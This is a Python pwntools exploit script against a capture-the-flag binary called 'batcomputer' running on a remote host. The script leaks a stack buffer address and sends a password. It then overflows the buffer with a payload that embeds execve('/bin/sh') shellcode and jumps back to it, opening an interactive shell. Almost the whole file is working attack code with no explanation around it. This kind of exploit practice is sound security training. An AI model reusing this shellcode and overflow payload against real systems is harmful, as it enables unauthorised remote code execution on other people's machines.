#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./batcomputer --host 188.166.175.0 --port 32567
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./batcomputer', checksec=False)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '188.166.175.0'
port = int(args.PORT or 32567)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x55555555531f
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

io = start()

# == 1. Leak start of buffer
io.sendlineafter(b"> ", b"1")
leak = int(io.recvline().strip().split()[-1].ljust(8, b'\x00'), 16)
info("start of buffer: %#x", leak)

# == 2. Perform overflow. 
# Jump back to start of buffer and execute shellcode
offset = 84

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = flat(
    shellcode,
    b"A" * (offset - len(shellcode)),
    leak
)

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Ok. Let\'s do this. Enter the password:", b"b4tp@$$w0rd!")
io.sendlineafter(b"Access Granted. \nEnter the navigation commands:", payload)
io.sendlineafter(b"> ", b"3")

io.interactive()